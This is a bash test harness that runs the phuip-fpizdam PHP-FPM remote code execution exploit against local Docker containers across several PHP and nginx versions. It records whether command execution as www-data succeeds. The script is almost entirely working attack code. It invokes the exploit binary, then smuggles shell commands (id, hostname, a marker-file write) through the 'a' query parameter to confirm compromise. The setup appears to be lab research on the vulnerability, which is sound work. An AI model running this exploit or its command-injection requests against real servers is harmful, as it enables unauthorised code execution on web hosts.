#!/bin/bash
# Clean-room re-run: restart the FPM container (wipes per-worker injected ini state),
# delete /tmp/a, prove baseline has no execution, then run the PoC and verify uid.
set -u
R=/tmp/opencode/research/fpm_alt_rce_20261023T084957Z
POC=$R/poc/phuip-fpizdam.bin
OUT=$R/raw/clean
mkdir -p $OUT
TSV=$R/raw/clean_results.tsv
[ -f $TSV ] || printf "case\tport\tcontainer\tbaseline_uid_before\tbaseline_code\tonlyqsl\tattack\tafter_uid_hit\tuid_line\tverdict\n" > $TSV

run_case() {
  local name=$1 port=$2 ctr=$3 qsl_timeout=${4:-120} att_timeout=${5:-120}
  docker restart $ctr >/dev/null 2>&1
  sleep 2
  docker exec $ctr rm -f /tmp/a >/dev/null 2>&1
  # baseline: no command execution expected
  local before="none"
  for i in 1 2 3 4 5; do
    b=$(curl -s --max-time 5 "http://127.0.0.1:$port/index.php?a=id")
    case "$b" in uid=*) before="PREINFECTED";; esac
  done
  local code=$(curl -s --max-time 5 -o /dev/null -w '%{http_code}' "http://127.0.0.1:$port/index.php")
  local oq=$(timeout $qsl_timeout $POC --only-qsl "http://127.0.0.1:$port/index.php" 2>&1 | tr '\n' '|')
  echo "$oq" > $OUT/${name}_onlyqsl.log
  local att="skipped" hit="" uid=""
  if echo "$oq" | grep -q "probably vulnerable"; then
    timeout $att_timeout $POC --logfile $OUT/${name}_attack.log "http://127.0.0.1:$port/index.php" >/dev/null 2>&1
    pkill -f "phuip-fpizdam.bin --logfile $OUT/${name}_attack.log" >/dev/null 2>&1
    att=$(tr '\n' '|' < $OUT/${name}_attack.log 2>/dev/null | tail -c 300)
    for i in $(seq 1 40); do
      b=$(curl -s --max-time 5 "http://127.0.0.1:$port/index.php?a=id")
      case "$b" in uid=*) hit=$i; uid=$(echo "$b" | head -1); break;; esac
    done
    # marker file written by the injected command (inside FPM container)
    curl -s --max-time 5 "http://127.0.0.1:$port/index.php?a=$(python3 -c "import urllib.parse;print(urllib.parse.quote('id;hostname;echo FPMALT-PWN-$name >/tmp/fpmalt_pwn_$name;cat /tmp/fpmalt_pwn_$name',safe=''))")" > $OUT/${name}_post.txt
  fi
  local verdict="not vulnerable"
  [ -n "$hit" ] && verdict="RCE www-data"
  [ "$before" = "PREINFECTED" ] && verdict="INVALID(preinfected)"
  printf "%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n" "$name" "$port" "$ctr" "$before" "$code" "$(echo "$oq" | tail -c 160)" "$att" "$hit" "$uid" "$verdict" >> $TSV
  echo "== $name: code=$code before=$before hit=$hit $verdict"
}

run_case A_tryfiles_7.2.23 29452 fpmalt-7223 120 120
run_case B_7.1.32 29421 fpmalt-7123 120 120
run_case B_7.2.23 29422 fpmalt-7223 120 120
run_case B_7.3.10 29424 fpmalt-7310 120 120
run_case D_nginx117_7.1.32 29441 fpmalt-7123 120 60
run_case D_nginx117_7.2.23 29442 fpmalt-7223 120 60
run_case D_nginx117_7.3.10 29443 fpmalt-7310 120 60
run_case E3_nosplit_pathinfo 29464 fpmalt-7223-e3 120 120
run_case C3_distro_snippet_7.2.23 29434 fpmalt-7223 120 120
